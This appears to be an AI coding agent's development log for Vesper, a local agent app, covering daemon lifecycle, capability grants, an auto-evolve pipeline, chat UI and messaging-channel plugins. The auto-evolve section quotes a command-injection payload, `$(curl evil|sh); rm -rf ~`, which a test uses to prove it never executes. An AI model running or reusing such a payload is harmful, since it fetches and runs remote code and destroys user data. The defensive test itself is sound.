  `status` (IPC ping + PID/uptime/version), `install`/`uninstall` (macOS launchd LaunchAgent).
- Pure logic TDD'd: `daemon-lifecycle.ts` (PID read/write/remove, `resolveDaemonState` with injectable
  liveness probe → running/stale/stopped) + `launchd.ts` (`renderLaunchAgentPlist`, XML-escaped,
  RunAtLoad+KeepAlive). Audit: `daemon_started`/`daemon_stopped` reuse the existing `events` table
  (no new "audit log" subsystem — the issue's separate audit file was unnecessary).
- ADAPTED AWAY (pre-pivot, N/A): JSON-RPC `ask`/`vault.*` IPC methods, llm_router, `packages/daemon`.
  Kept the existing newline-JSON ping IPC + the in-process scheduler/UI host. CLI shape changed:
  bare `vesper daemon` → `vesper daemon run`/`start` (better UX, no `&`); README + docs/ui.md + the
  `vesper ui` hint updated; command table regenerated.
- Verified live end-to-end: status(stopped)→start(PID, detached)→status(running,uptime,version)→
  pidfile@0600+socket→stop(SIGTERM,cleanup)→status(stopped); single-instance guard ("already running");
  audit events confirmed in the events table.
- DEFERRED gate (noted on the issue): live `launchctl load` + reboot-survival NOT run autonomously —
  a KeepAlive LaunchAgent pointing at a relative dev entrypoint would crash-loop; a real install needs
  an absolute `vesper` path (`bun link`). Plist generation is unit-tested. 514 tests / 0 fail; biome clean.

## Linear backlog triage (Omar goal: "all issues completed or cancelled")

DEV-89 completed (above). Cancelled as superseded by the bring-your-own-CLI + elder-first pivot
(reversible, per-issue reasons on each): DEV-93 (macOS-Shortcuts capture), DEV-94 (Whisper/@xenova
voice — superseded by `specs/voice-modalities.md`), DEV-36/90/98/99 (M4 external-adapter platform +
SDK + Hermes adapter), DEV-100 (pre-pivot launch — superseded by `specs/installer-distribution.md`).
DEV-13 + DEV-48 cancellation was BLOCKED by the permission classifier (auto-cancelling issues the
agent didn't create) — left in Backlog for Omar. Net: Vesper project is all-terminal except those two.

## Forge design + Slice 4 (evolve-skills accept/revert) — SHIPPED

Omar's vision: "Vesper auto-codes new features by itself + evolves skills and features." Designed via
two multi-agent workflows: (1) a 6-direction Vesper World UI design panel (Hearth-Cottage chosen —
see `specs/elder-first-ui-redesign.md`); (2) a 5-facet + security-adversary + architect design of the
self-build/evolve capability -> `specs/forge-self-build-evolve.md` ("Forge"). Omar's post-SPEC
decisions: CREATE-local + evolve-skills first; BLOCK forge code-execution until a robust cross-platform
sandbox exists; NETWORK_FETCH hard-blocked v1; elder = wishes + watch only. The sandbox block gates the
CREATE execution path (Slices 5-7), so the buildable increment was Slice 4.

- **Built (the deferred skill-train T7):** `vesper skill accept <name>` adopts the trained `best.md`
  into the committed `.ai/skills/<name>/SKILL.md`, and `vesper skill revert <name>` restores it. Core
  is a pure, injected-deps `acceptBest`/`revertSkill` (`skill-train/accept.ts`, test-first) over new
  append-only checkpoint methods on `SkillTrainStore`. No untrusted code execution -> safe under the
  sandbox block.
- **Security spine (the must-fix constraints, encoded):** human ack before any overwrite (full diff
  shown; non-TTY refuses without `--yes`); the prior committed bytes are checkpointed BEFORE the write
  (git-independent rollback); checkpoints are APPEND-ONLY — written with `wx`, probing the next free
  integer slot, so a same-ms `Date.now()` or a backward clock can never overwrite history (Hard rule 4,
  never rm); `skill_promoted`/`skill_reverted` audit events (best-effort, never fails the action);
  `assertSkillName` enforced at both command entrypoints (path-traversal boundary, not incidental);
  committed bytes read ONCE (closes the diff->write TOCTOU); cycle-log checkpoint ref is home-relative
  (no `/Users/<name>` PII in a committed file).
- **REVIEW:** 3-lens fan-out (code-reviewer + security-auditor + test-engineer). Security + tests =
  ship; correctness = revise (the checkpoint-overwrite high + audit-kind medium). All fixed, including
  the test-engineer's coverage gaps: multi-magnitude numeric-sort test (catches lexicographic
  regression), append-only file-survival assertion, same-`at` collision-keeps-both, stray-file-ignored,
  and a real-fs accept->revert byte-fidelity round-trip (trailing newline / multibyte / blank line).
- **DELTA vs spec:** v1 `revert` restores the LATEST checkpoint only (selecting an older one is a
  follow-up) — noted in the spec. 529 tests / 0 fail (+15 for this slice); Biome clean; no provider SDKs.
- **Next:** Hearth-Cottage UI build (approved, queued); the robust cross-platform sandbox sub-spec that
  unblocks Forge CREATE (Slices 5-7).

## Vesper World redesign (Hearth-Cottage) + pluggable renderer + logo registry — SHIPPED

Two design workflows drove this: a 6-direction elder-first UI design panel (Hearth-Cottage chosen,
`specs/elder-first-ui-redesign.md`) and a render-plugin/cyberpunk design (`specs/pluggable-renderer.md`).
Omar then redirected: the UI must be a PLUGGABLE renderer (pick how you see your agents) where EVERY
agent shows its real brand logo; Hearth-Cottage is theme #1, cyberpunk is theme #2 (prompt in the spec,
to be generated via claude.ai then ported). Decisions: per-theme logo framing (Hearth keeps wool
creatures for pipelines, logo on the live lantern; cyberpunk shows a logo for every node); cyberpunk
ships dev-only until an a11y/contrast review.

- **Hearth-Cottage look** (presentation-layer only; buildWorld/server/127.0.0.1/SceneGraph FROZEN):
  cottage room baked offscreen (60fps win), animated fire + embers, braided rug, dusk window; the 9x9
  sprite re-skinned as warm WOOL creatures; gentle non-alarming error (a "?" + a color-INDEPENDENT
  "needs a look" chip); a live visitor carries a LANTERN with its brand emblem; warm "note by the fire"
  inspect card with a 64px portrait well + 56px Run; Georgia serif title; prefers-reduced-motion honored.
  Verified end-to-end in a real browser.
- **Slice 1 — brand/logo registry** (`client/brand/`): a TOTAL `resolveMark()` that never returns null
  (presence-prefix -> exact -> prefix -> substring -> Vesper-default), so the always-a-logo invariant is
  structural. Built-ins claude/codex(OpenAI knot)/gemini/opencode/zeroclaw + hermes/ironclaw + the
  Vesper "V" fallback. `emblems.ts` retired; `render.ts` lantern resolves through it.
- **Slice 2 — WorldTheme plugin seam** (`client/theme/` + `client/themes/`): the `WorldTheme` contract
  (id, displayName, the existing drawScene signature), a `THEME_REGISTRY` mirroring ModuleRegistry +
  `resolveTheme` (unknown -> default, never throws), Hearth registered as the default theme, `main.ts`
  renders via `activeTheme.drawScene`. Behavior-preserving (verified no visual regression live).
- DEFERRED: Slice 3 (theme switching UX — config `ui.theme` + `?theme=` + elder picker) and Slice 4
  (port the cyberpunk theme once its index.html is generated from the prompt). 544 tests / 0 fail
  (+10: brand + theme registries); Biome clean; bundles; no provider SDKs. docs/ui.md update folded
  into Slice 3 (themes documented there).

## Pluggable renderer Slice 3 — theme selection — SHIPPED

Theme switching plumbing (selectable themes), per `specs/pluggable-renderer.md`:
- `client/theme-store.ts` (pure, tested): `pickThemeId` precedence URL `?theme=` > localStorage >
  server `<meta name="vesper-theme">` > registry default; `readUrlTheme` + storage/meta readers.
- config: `ui.theme` in `~/.vesper/config.json` (`normalizeUi`, drop-on-invalid); daemon threads it
  to `startUiServer({ defaultTheme })`; the server stamps a sanitized `<meta>` hint into the served
  HTML (shell templating only — `/api/world` untouched).
- `vesper ui --theme <id>` opens `?theme=<id>` (browser remembers it); `--theme` added to the
  dispatch VALUE_FLAGS allowlist. `main.ts` resolves the active theme via theme-store at load.
- DEFERRED to Slice 4: the in-page elder theme PICKER overlay (a one-option picker has no value
  until cyberpunk lands as theme #2). 545 tests / 0 fail (+6 theme-store); Biome clean; bundles;
  CLI docs + README regenerated; live smoke green (unknown `?theme=` falls back, no error).

## Sub-agent orchestration backbone — per-task grants (mig 005) + orchestration & live trace (mig 006) — SHIPPED

`specs/vesper-personal-agent.md` umbrella, build slices 1-2 (`per-task-capability-grants.md`,
`agent-orchestration-and-trace.md`). No Linear issue (workspace issue-capped) -> this entry + the commit
are the record (Rule 11 fallback). Built by a multi-phase workflow, then verified + hardened by an
adversarial review workflow whose NEEDS_FIXES verdict drove the fix pass below.

- **Per-task grants (mig 005_task_grants):** `SPAWN_SUBAGENT` added (capability union -> 9, deny-by-default);
  `scheduler.register()` writes a per-task grant (= declared `required_capabilities`) and enforces a CEILING
  (grant SHALL be a subset of the host union, else `grant_exceeds_ceiling`); `#invoke` now gates on the
  per-task grant (deny-by-default when no grant row) IN ADDITION to the host-union ceiling — a low-trust
  pipeline no longer inherits another's caps. Built-in parity preserved. `store.{upsertTaskGrant,
  getTaskGrant}` keyed by `(handler_id, content_hash)`.
- **Orchestration + live trace (mig 006):** `runs.parent_run_id` + `status_updated_at` + `run_events`.
  `ctx.spawn(descriptor)` runs registered handlers as in-process depth-1 children (two-sided cap gate:
  descriptor caps ⊆ parent grant AND ⊆ host ceiling; `subagent_depth` + `maxFanout` guards); the run row
  opens UP FRONT (`startRun` "running") so the tree is live the instant a child spawns. `ctx.emitProgress`
  + `RUN_EVENT` bus -> `server.publish("agent:<runId>")` + a lite `world` pulse; `withTimeout`/
  `remainingBudgetMs` factored into `timeout.ts`. UI: WS subscribe/unsubscribe (UUID-guarded) + replay
  routes `GET /api/runs/:id/{events,tree}` (local-origin guarded) + a client activity-panel renderer.
- **Review-and-fix pass:** (a) strict-`tsc` compile — a closure-mutated `let recorded` narrowed to `never`
  (suite was green only because `bun:test`/CI don't run `tsc`); fixed via a ref object + `startRun` query
  tuple + test-mock completeness. (b) double-finalize that clobbered a handler-committed run status on a
  later throw -> `rowFinalized` gate (scheduler + subagent). (c) live `RUN_EVENT` frames now carry the
  persisted `id` + `ts` (were undefined, so the client de-dupe dropped every step after the first); the
  `complete` trace event is now persisted/replayable. (d) write-side `appendRunEvent` kind guard. Added
  regression tests for the load-bearing UNTESTED invariants: child RUNTIME capability narrowing (a mutation
  letting a child inherit the parent grant previously left all tests green), record-then-throw status
  preservation, and a genuine pre-006 row reading back `parent_run_id` NULL.
- VERIFIED FALSE POSITIVE: the capability-denial early return runs BEFORE `startRun`, so no "running" row
  is stranded (the review's must-fix #6 did not hold against the actual code).
- 613 tests / 0 fail (+4 over the as-built 609); Biome clean; no NEW tsc errors (16 PRE-EXISTING
  Bun-vs-tsc friction errors remain in unrelated files; CI runs biome + bun test, not tsc); no provider SDKs.
- DEFERRED (need Omar's call / tied to the chatbot-home UI redesign): client per-CHILD trace backfill +
  `agent:<childRunId>` subscribe (the server contract is correct; only the canvas renderer fetches
  root-only); `task_grants` keyed by handler_id vs task id (two tasks sharing a handler collide — a
  design + migration decision); `emitProgress` redaction under `redactSummaries` (no spec SHALL); the
  `/events` oldest-500 backfill cap.

## Auto-evolve pipeline — scheduled reflect -> propose -> gated-additive skill acquisition — SHIPPED

`specs/auto-evolve.md` (requirement #5 auto-evolve + #6 elegant+secure of the personal-agent reframe).
No Linear issue (workspace issue-capped) -> this entry + the commit are the record (Rule 11 fallback).
A proposal-only + gated-additive vertical that ships standalone — depends only on SHIPPED seams
(per-task grants, the `events` table, the scheduler cron path, the injectable `ProcessRunner`), NOT on
the still-blocked forge sandbox (it executes no LLM-generated code).

- **New `auto-evolve` core module (`vesper-core/src/auto-evolve/`, all pure, 100% lines):**
  `skill-name.ts` (the security linchpin — `isAllowedSkillName`: `^[a-z0-9][a-z0-9-]{0,63}$` + an
  allowlisted `owner/` source prefix, `unknown`-typed so it guards the runtime boundary); `gather.ts`
  (`gatherSignals` — windows `Store.listRuns` + `TaskPersistence.{listFailedTasks,list}` by `sinceMs`,
  rolls up error runs by pipeline, builds a deterministic, length-capped digest — each error field
  collapsed + capped to mitigate prompt-injection); `reflect.ts` (`buildReflectPrompt` — frames the
  digest inside an explicit UNTRUSTED-DATA fence, modeled on skill-train's `buildOptimizerPrompt`);
  `parse.ts` (`parseEvolveReport` — fenced-JSON closed shape, FAIL-CLOSED `{ok}` result, never throws,
  never `eval`, drops malformed proposal entries).
- **`PROCESS_RUN` capability (10th value, union + tuple + `isCapability`):** a distinct, dangerous
  side effect no existing cap covered (FS_WRITE = files, NETWORK_FETCH = HTTP). The DEFAULT task omits
  it, so the out-of-the-box build literally cannot shell out. Persists into the existing
  `task_grants`/`scheduled_tasks` TEXT columns — no DDL, no migration.
- **`ctx.readSignals(opts)` read seam (READ_STORAGE-gated, on `PipelineContext`):** returns a FROZEN
  `EvolveSignals` snapshot (not the live Store), so a handler cannot read past its window or write
  through it. Mirrors the `recordRun`/`emitProgress` capability-gate template; the scheduler passes its
  `TaskPersistence` handle into `buildPipelineContext` (new optional `taskPersistence` dep; absent ->
  failed-task/last-error sections read empty, run-derived signals still work).
- **`auto-evolve` pipeline (`packages/pipelines/auto-evolve/`):** factory `createAutoEvolveHandler(deps)`
  closes over injected `appendEvent` + `runProcess` seams (so the unit suite shells out to nothing and
  writes no real DB); the default-registered `autoEvolveHandler` opens the store lazily per write +
  uses the real `runProcess`. Stage 3 writes one `report` + one `skill_proposal`/skill +
  one `fix_proposal`/fix to `events` under `source:"auto-evolve"` (reuse the events table, no migration).
  Acquisition runs `bunx skills add <name> --yes` ONLY when (a) `acquire=true`, (b) the task declares
  PROCESS_RUN (else `assertCapabilities` throws before any process), and (c) the name passes
  `isAllowedSkillName` (a failing name -> `acquire_skipped` audit, never executed); the name is a
  discrete `args[]` element (no shell string). Cron `0 3 * * *`, `enabled:false` (opt-in),
  `max_runs_per_day:1`, `max_duration_ms:300000`; default cap set is proposal-only.
- **`vesper evolve list` (read-only CLI):** renders the latest `report` + open skill/fix proposals via
  `listEvents({source:"auto-evolve"})`. CLI glue — no TDD (Hard rule 7).
- SAFETY HELD: proposal-only for code (handler writes ZERO files; `fix_proposal` is the explicit hand-off
  to the human-gated software-engineer pipeline); gated-additive-only for skills; untrusted `last_error`
  reaches the prompt only as framed, capped data and reaches NO process invocation — proven by a test
  that injects `$(curl evil|sh); rm -rf ~` as both a `last_error` and an echoed skill name and asserts
  the runner is never called.
- 667 tests / 0 fail (+ the auto-evolve suite: skill-name, gather, parse/reflect, context readSignals,
  scheduler end-to-end readSignals, handler); auto-evolve core 100% lines, handler 95% (the only
  uncovered span is the FS-coupled default store-opening closure, intentionally not unit-tested); Biome
  clean; no NEW tsc errors (same 16 PRE-EXISTING Bun-vs-tsc friction errors in unrelated files); no
  provider SDKs in `bun.lock`.
- DEFERRED (per spec Out of Scope): applying `fix_proposal`s (software-engineer pipeline); authoring
  pipeline CODE (forge, blocked on the sandbox); `NETWORK_FETCH`; a RAG/embedding index over signals;
  an elder-surface approval tile; auto-running skill-train on a newly acquired skill.

## Chatbot home + editable pipeline templates (#9 + #4) — SHIPPED

`specs/chatbot-home.md`. The post-onboarding HOME is a simple chatbot; the canvas demotes to a side
activity panel. Built on the SHIPPED orchestration+trace backbone (consumed, not modified). No Linear
issue (issue-capped) -> specs/ + this entry + the commit are the record (Rule 11). Built by a
Backend->Client->Review workflow; the review's 2 real HIGH gaps were then fixed by the lead.

- **Storage (migration `007_chat_home`):** `chat_sessions`, `chat_turns`, `pipeline_templates` + index;
  6 synchronous `Store` methods (createSession, appendTurn, listSessions, listTurns, getTemplate,
  upsertTemplate) mirroring the existing JSON/assert helpers. `chat_turns.run_id` links an assistant
  turn to the run that produced it (transcript bubble == activity-tree root, same data two ways).
- **Router pipeline (`packages/pipelines/router/`):** a chat message is a manual `scheduler.run("router",
  {params})` (the EXISTING run path — no new execution). The handler classifies via `ctx.complete` to ONE
  label, maps it through a FIXED ALLOWLIST to a registered handler id, and `ctx.spawn`s it; an
  unmapped/free-form label -> a clarify turn (NO spawn, no dynamic id — preserves no-eval). caps
  [CLI_INVOKE, WRITE_STORAGE, SPAWN_SUBAGENT].
- **Routes + WS:** `POST /api/chat`, `GET /api/chat/sessions`, `GET /api/chat/sessions/:id/turns`,
  `GET /api/pipelines`, `GET|PUT /api/pipelines/:id/template`; a `chat:<sessionId>` WS topic next to the
  backbone's `agent:<runId>` (one socket, UUID-guarded). Client: transcript home + demoted activity
  panel (reuses the runTree render) + a templates screen; reduced-motion + WCAG-AA honored.
- **Security:** a minimal out-of-band approval-token module (`vesper-core/src/approval/`, CSPRNG
  single-use) gates `PUT /template`; `POST /api/approval/request` mints a code and prints it to the daemon
  TTY (out-of-band — never in the HTTP response, so a local app can mint but not read it). The future
  `security-hardening.md` adopts this seam. `POST /api/chat` is isLocalRequest-only (deliberate parity
  with the existing run route, so the canvas Run button still works).
- **Lead fixes over the workflow output** (2 real HIGHs the review caught): (1) `mint()` had NO production
  caller -> added the `/api/approval/request` mint path + test, so template editing actually works
  end-to-end; (2) the router ignored template `default_params` -> it now MERGES the target's editable
  default_params UNDER the user message (injected via `registerPipelines({getDefaultParams})` -> daemon
  wires `store.getTemplate`), so an edited template configures its runs (#4). + router/server tests.
- 724 tests / 0 fail (+ chatbot suite + the 2 fix tests); Biome clean; no NEW tsc errors (same 16
  pre-existing); no provider SDKs.
- NOTED (not blocking): `PUT /template` persists prompt/params only — schedule/caps stay editable via
  `vesper schedule` (the spec's Design-Decisions/Acceptance contradict each other; took the conservative
  path). Migration `007_chat_home` takes the next free id; the umbrella ledger's planning reservation
  (007=rag) shifts to 008/009 for rag/eval (gitignored planning doc, reconciled at their build).
- DEFERRED (per spec Out of Scope): the security-hardening §C token formalization; multi-session history
  UX; capability editing from the templates UI; token-level streaming.

---

## Desktop shell redesign — premium dark-glass native companion + Vesper World rebuild — SHIPPED

- Specs: `specs/desktop-app-shell.md` + `specs/vesper-world-rebuild.md` (Omar-authorized 2026-06-02; record
  surface = specs + this log; Linear issue cap active). Reference look: OpenClaw Windows Companion.
- **Decisions locked (Omar):** premium dark-glass SUPERSEDES the elder-first *visual* framing (Hard rule 14
  amendment pending on a later sync); primary section name = **Pipelines**; presence/echo MOVES to
  Diagnostics (not deleted); built shell + rebuilt Chat together as slice 1.
- **What shipped:** the `@vesper/ui` client is now an app shell — custom draggable titlebar (Cmd+E command
  search, live status pills off `/api/status`), grouped sidebar, a client-side `SectionRouter`, and a
  chrome-only theme system (dark default; light/hearth opt-in) that REPLACES the canvas-coupled `WorldTheme`.
  14 sections: Chat + Runtime/CLIs/Permissions/Sandbox/Settings/Diagnostics/About (live) + Pipelines/
  Channels/Schedule (thin) + Skills/Memory/Voice (honest stubs naming their specs).
- **Vesper World rebuilt:** the pixel-art canvas + machine-wide presence home are RETIRED (controlled
  `git rm`, recoverable). Chat = transcript + a Vesper-ONLY activity rail (follows the conversation's run
  tree via the existing `/api/chat` + run-trace APIs; subscribe-before-backfill + de-dupe preserved). No
  backend rewrite — reused chat/router/sessions/turns verbatim.
- **Server:** new read-only `/api/status`, `/api/presence`, `/api/runs`; `/api/world` + `snapshot.ts` removed;
  presence poll kept (feeds `/api/presence` for Diagnostics).
- **Native:** macOS overlay titlebar (`TitleBarStyle::Overlay` + `hidden_title`, cfg-gated to macOS) so the
  custom HTML titlebar shows with the traffic lights inset; tray + single-instance from DEV-112 slice 3.
- **Parallel build:** lead built the backbone + Chat + real sections + server routes; 2 sub-agents built the
  6 thin views + the Rust overlay window concurrently (file-disjoint). Net **-890 lines** tracked in vesper-ui.
- **Gotcha (cost a runtime crash Omar caught):** the browser client is bundled by Bun (which does NOT error
  on an undefined identifier) and sits OUTSIDE the root tsc program, so a section referenced in the barrel
  but never imported (`sandboxSection`) only failed at runtime in the browser — green tests + clean bundle
  missed it. FIX + GUARD: `sections/index.test.ts` imports the barrel and asserts ALL_SECTIONS (14, unique
  ids, valid shape). Lesson: for the browser client, an import-the-barrel test is the real typecheck.
- Verified: `biome ci` clean (2 cosmetic warnings), vesper-ui 46 / vesper-cli 104 pass, no new tsc errors in
  touched files, compiled sidecar serves the new shell end-to-end. No provider SDKs.
- DEFERRED: privileged config writes from Settings (theme is client-side; default-CLI read-only); full
  template editing in Pipelines (read-only view); Windows/Linux window chrome (macOS-first per Omar); the
  one `!important` (reduced-motion) biome warning; the menu-bar popover app + internal-pipelines auto-skills
  feature (next requests).

---

## Agent context-window visibility (orchestrator + sub-agents) — SHIPPED

- Spec: `specs/agent-context-window.md` (local; Linear issue cap active — spec + this log + commit are the
  record, Rule 11). Authorized by Omar 2026-06-04. Parallels the Claude Code statusline HUD built the same
  day (`~/.claude/statusline-context.ts`): the same context-fill signal, now on Vesper's OWN runs in the
  Chat activity rail.
- What shipped: a per-run context pill (`ctx <bar> <pct>%`, green/amber/red/bright by fill) on the
  orchestrator row AND each sub-agent row.
  - CAPTURE (cli): `CompleteResult.usage?` + a `parseOutput` hook on BaseAdapter; the Claude adapter now runs
    `claude -p --output-format json` and unwraps `{ result, usage }` (graceful fallback to plain text + no
    usage on any non-JSON / old-CLI output — never throws).
  - RECORD (scheduler): `ctx.complete` records the LATEST completion's prompt size (input + cache tokens,
    matching the HUD; output excluded) via `store.recordRunContext` + a `usage` run_event + a RUN_EVENT bus
    emit, all best-effort (a capture failure can never break a completion). Sub-agents inherit it for free
    (same `buildPipelineContext`). New core helper `contextWindowFor(model)` (1m hint -> 1M, else 200k).
  - PERSIST (storage): migration `008_run_context` (ctx_used_tokens/ctx_limit/ctx_model on `runs`),
    `recordRunContext`, `RunEventKind` += `usage`, optional `RunRow.context`.
  - EXPOSE/RENDER (ui): `RunTreeInfo.run.context` + server tree map; the activity rail renders the pill from
    the tree snapshot and updates it live from `usage` frames (already published generically — zero new
    server WS code), excluding `usage` from the step log.
- Decisions (Omar): latest-completion metric; "ctx --" for CLIs that report no usage (no estimation);
  compact header pill; Claude `--output-format json`.
- Parallel build: lead pre-defined the shared types, then ran T1 (cli) + T2 (storage) as two file-disjoint
  sub-agents concurrently; lead integrated T3 (scheduler) + T4 (server) + T5 (rail) and owned the barrel
  re-exports.
- Gotchas: (1) `exactOptionalPropertyTypes` rejects assigning `undefined` to optional props — used
  conditional spreads for `usage` + cache fields. (2) Making `RunRow.context` REQUIRED broke partial RunRow
  literals in tests (gather/context) — made it optional (`context?`), which the store mapper always fills.
  (3) Completions now emit a `usage` world pulse, so a WS test that grabbed the FIRST frame had to filter for
  `run:completed`.
- Verified: 762 tests / 0 fail (+29); Biome clean (2 pre-existing `!important` warnings); tsc 31 = exact
  merge baseline (0 new); no provider SDKs (usage parsed from the user's own CLI). DEFERRED: live browser
  visual verify of the pill (data path is integration-tested server-side); a peak-vs-latest toggle; usage
  for non-Claude CLIs that do not emit it.
- Follow-up (verified against the real `claude` CLI, post-ship): the `--output-format json` envelope reports
  the EXACT window at `modelUsage[model].contextWindow` (1,000,000 for `claude-opus-4-8[1m]`). Now read into
  `CompleteUsage.contextWindow` and PREFERRED over the `contextWindowFor` name-heuristic (kept as the fallback
  for CLIs that omit it) — so the fill % is exact, not guessed. Text/usage/model field names also confirmed
  against the real envelope. 765 tests / 0 fail.

---

## Router grants each routed child its target's declared capabilities — SHIPPED

- Context: surfaced while re-capturing the README hero ("Vesper actually working"). The chatbot-home chat
  flow could never show a clean success — the `router` granted every spawned child a flat `["WRITE_STORAGE"]`,
  but both allowlisted targets need more: `selftest` -> `CLI_INVOKE`, `orchestrate`/orchestrator-demo ->
  `SPAWN_SUBAGENT`. So a routed child was denied at its own context boundary ("capabilities denied: …") and
  the only clean router outcome was a `clarify` turn (exactly what the old hero showed). Authorized by Omar
  2026-06-04 (Linear issue cap active — this log + commit are the record, Rule 11).
- Fix (`packages/pipelines/router/handler.ts`): replaced the constant `CHILD_CAPABILITIES` with
  `CHILD_CAPABILITIES_BY_HANDLER`, keyed off each target's OWN `required_capabilities` (single source of
  truth: the imported `selftestTaskInput` / `orchestratorDemoTaskInput`), plus a least-privilege
  `WRITE_STORAGE` fallback for any custom-allowlist target with no mapping. The router task already declares
  the UNION (CLI_INVOKE + WRITE_STORAGE + SPAWN_SUBAGENT), so every grant is within the router run's ceiling —
  the flat grant was simply the bug, not a security boundary.
- Result: chat -> `selftest` now runs clean (router ok -> selftest ok) — the honest README hero. NOTE the
  depth-1 invariant (`scheduler/subagent.ts`: a sub-agent cannot spawn sub-agents) still blocks chat ->
  `orchestrate` (orchestrator-demo would need to spawn its workers at depth 2); that route stays
  partial-by-design and the rich research/draft/review fan-out only renders when orchestrator-demo runs
  TOP-LEVEL. Follow-up worth a ticket when the cap lifts: either drop `orchestrate` from the router allowlist
  or let orchestrator-demo degrade to inline stages under the depth limit.
- TDD: updated the selftest-route test to expect `["CLI_INVOKE","WRITE_STORAGE"]` (it was asserting the buggy
  flat grant) and added an orchestrate-route test asserting `["SPAWN_SUBAGENT","WRITE_STORAGE"]`.
- Verified: 766 tests / 0 fail; Biome clean; tsc 0 errors; end-to-end via the daemon (chat -> router ok ->
  selftest ok, with real context pills). No provider SDKs.

---

## Connections surface — Telegram live (CLI + daemon wiring + live page) — SHIPPED

- Spec: `specs/connections-surface.md` (local; sub-slice of `connections.md`). Issue-capped — this log +
  commit are the record (Rule 11). Authorized by Omar 2026-06-04. The Connections CORE was already built +
  tested (`vesper-core/connections/`: catalog, registry, TelegramHandler, allowlistedFetch, audit) but 100%
  UNWIRED — the Channels page told users to "configure with the vesper CLI" while no such command, no
  `/api/connections` route, and no daemon registry existed. This slice connects the core to its CLI/daemon/
  UI surfaces so a Telegram message actually reaches the chatbot and replies.
- Channels are a PLUGIN (Omar's ask). New `connections/plugins.ts` is the single extension point
  (`CHANNEL_PLUGINS` / `ChannelPlugin` / `channelPluginById` + `CHANNEL_GRANTS`). Telegram is the only
  plugin; Discord/WhatsApp/Signal report `available:false` -> "soon" honestly. Adding a channel later = one
  plugin entry + a handler + a catalog flag; daemon/CLI/UI iterate the registry and do not change.
- WhatsApp DECISION (deferred, recorded — Omar delegated it): when built it is a plugin using a PURE-HTTP
  transport through `allowlistedFetch` — Meta Cloud API or an unofficial REST+webhook gateway
  (Whapi/Maytapi). Baileys / whatsmeow / open-wa are REJECTED (a heavy reverse-engineered WhatsApp-Web
  client is a runtime dependency + ToS/ban liability vs Vesper's zero-runtime-dep posture). Polling
  preferred over a public webhook (stay behind NAT, local-first).
- What shipped: core `plugins.ts` + pure `state.ts` (`channelStates()` shared by the CLI + the API route);
  config `connections` block + `normalizeConnections` (narrow-never-widen allowedHosts vs the catalog);
  `vesper connections list|set|test|enable|disable` (set/test read the credential from STDIN -> vault;
  config holds only the vault KEY name); `connections-wiring.ts` (`buildChannelRegistry` builds +
  authenticates + registers every available+enabled+credentialed channel, isolating + auditing a bad
  token; `makeChannelSink` bridges inbound -> POST /api/chat -> reply back via `handler.send`, per-chatId
  session map); server `GET /api/connections` + a `reply` field on `POST /api/chat`; daemon opens the
  Vault, builds the registry, passes a state provider to the UI, and `startAll(sink)` AFTER the UI is
  listening (stops on shutdown); the LIVE Channels page (real state + accurate `vesper connections` hints +
  setup links; MCP stays read-only).
- Scope reductions (deliberate, vs the parent spec): UI is READ-ONLY — channel mutations are CLI-only (the
  trusted stdin path), so no browser enable/disable route + no approval-token gate THIS slice (the shipped
  `requireApproval` is ready for it as a follow-up). The ChatSink uses a localhost self-POST to the
  existing `/api/chat` (faithful to connections.md's "no new execution path") instead of extracting a
  shared run function. `normalizeConnections` drops malformed entries silently (matching the shipped
  `normalizePresence`).
- Verified: 795 tests / 0 fail (+29); `biome ci` clean (2 pre-existing `!important` warnings); tsc 0; no
  provider SDKs. Live on an isolated home: `connections set telegram` (stdin) wrote config + vault; the
  daemon built the registry + attempted getMe; `GET /api/connections` reported telegram
  available+configured+enabled, running=false on a FAKE token (auth isolated + audited); the live Channels
  page rendered "check token" honestly. (A real Bot API round-trip is covered by mocked-fetch unit tests;
  not exercised against live Telegram — no token.)
- Follow-ups: Discord handler (second plugin, same contract); browser enable/disable behind the approval
  token; hot enable/disable without a daemon restart; persisted Telegram-chat -> session mapping; MCP
  enable/disable.

---

## Discord + WhatsApp channel plugins — SHIPPED

- The two follow-up channels, validating the channels-as-a-plugin design: each was a new handler + one
  CHANNEL_PLUGINS entry + a catalog status flag. The daemon, CLI, and UI iterate the registry and did NOT
  change for either (the WhatsApp `params` plumbing was the only cross-cutting addition). Authorized by Omar
  2026-06-04. Issue-capped: cycle-log + commits are the record (Rule 11).
- DISCORD (commit c9e21b6) — two-way, but receive needs the Gateway WebSocket (no long-poll). A minimal
  Gateway client: HELLO -> IDENTIFY (intents GUILD_MESSAGES | DIRECT_MESSAGES | MESSAGE_CONTENT) ->
  heartbeat -> MESSAGE_CREATE -> sink (ignoring bot/self), reconnecting with a fresh identify on a dropped
  socket; replies via REST POST /channels/{id}/messages. The WebSocket factory is INJECTED so the suite
  connects to nothing, and the socket is opened only after the SAME NETWORK_FETCH + host-allowlist guard as
  allowlistedFetch (gateway.discord.gg added to the descriptor allowlist). Setup needs the privileged
  MESSAGE_CONTENT intent (tutorial, not code).
- WHATSAPP — SEND-ONLY v1 (Omar chose "send-only now, two-way later"). WhatsApp has NO free behind-NAT
  inbound: receive needs a public webhook (tunnel) or the rejected reverse-engineered WA-Web client, so
  `receive` is a no-op and two-way is deferred to a webhook-endpoint follow-up. `send` posts a text via the
  Cloud API (graph.facebook.com) through allowlistedFetch. The Cloud API needs the business `phoneNumberId`
  (the sender) beyond the token -> added a generic, NON-secret `params` field to a channel's config
  (`ConnectionConfig.params`, threaded through `ChannelBuildOptions` + the wiring) so the token stays in the
  vault while `phoneNumberId` lives in config; `OutboundIntent.chatId` is the recipient's number.
- NEW `vesper connections send <id> <chatId>` (message via stdin) makes send-only genuinely usable today
  (and works for every channel) — without it WhatsApp send would be latent (no pipeline-notify trigger yet).
  `set <id> [key=value ...]` now captures non-secret params (e.g. `set whatsapp phoneNumberId=PN1`).
- Whack-a-mole lesson: each shipped channel flips a catalog id from unavailable -> available, breaking the
  "no shipped handler" test assertions. Moved them down the catalog (discord -> whatsapp -> signal); Signal
  is the remaining unavailable id (no handler — local signal-cli, deferred).
- Verified: 813 tests / 0 fail (+18 across both); biome ci clean; tsc 0; no provider SDKs. Live at the CLI:
  `connections list` shows Telegram/Discord/WhatsApp available; `set whatsapp phoneNumberId=PN1` wrote the
  config params + vault token; the `send` command is wired. Real Bot/Gateway/Cloud-API round-trips are
  covered by mocked transport (WS + fetch) unit tests — not exercised against live services (no tokens).
- Follow-ups: WhatsApp two-way (webhook endpoint + tunnel decision); a pipeline-notify trigger that calls
  handler.send; Signal (local signal-cli) if wanted; Discord live verification with a real bot token.

